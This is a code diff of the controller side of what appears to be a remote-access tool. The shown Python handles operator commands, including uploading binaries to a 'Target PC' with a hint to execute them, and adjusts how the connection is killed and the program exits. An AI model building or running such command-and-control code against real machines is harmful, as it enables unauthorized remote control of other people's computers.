@@ -64,7 +64,7 @@ def Server():
             try:
                 data = input("-> ")
                 msg = data.encode()
-                args = data.split()
+                # args = data.split()
 
                 if(data == "info"):
                     try:
@@ -95,7 +95,7 @@ def Server():
                         
                 elif(data == "bsendfile"):
                     try:
-                        print("(TIP : Use exec-file to Execute an Application)")
+                        #print("(TIP : Use exec-file to Execute an Application)")
                         filename = input("[?] Binary Filename -> ")
                         rfilename = input("[?] Binary Filename on Target PC -> ")
                         with open(filename, "rb") as sendfile:
@@ -153,11 +153,10 @@ def Server():
                     """)
                 elif(data == "kill"):
                     print("[^] Killing Connection...")
-                    client.close()
+                    SendData("kill")
                     server.close()
-                    print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.")
                     time.sleep(1)
-                    quit()
+                    exit(True)
                 else:
                     print("[~] Unknown command.")
             except KeyboardInterrupt:
@@ -181,7 +180,7 @@ def Server():
                 server.close()
                 print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e_one)+")")
                 time.sleep(1)
-                quit()
+                exit(True)
                 
 
             except ConnectionRefusedError as e_two:
@@ -189,7 +188,7 @@ def Server():
                 server.close()
                 print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected. ("+str(e_two)+")")
                 time.sleep(1)
-                quit()
+                ConnectionManage();
                 
 
             except ConnectionResetError as e_three:
@@ -198,7 +197,7 @@ def Server():
                 server.close()
                 print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e_three)+")")
                 time.sleep(1)
-                quit()
+                exit(True)
                 
 
             except Exception as e:
@@ -206,7 +205,7 @@ def Server():
                 server.close()
                 print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e)+")")
                 time.sleep(1)
-                quit()
+                exit(True)
                 
 
         while(True):
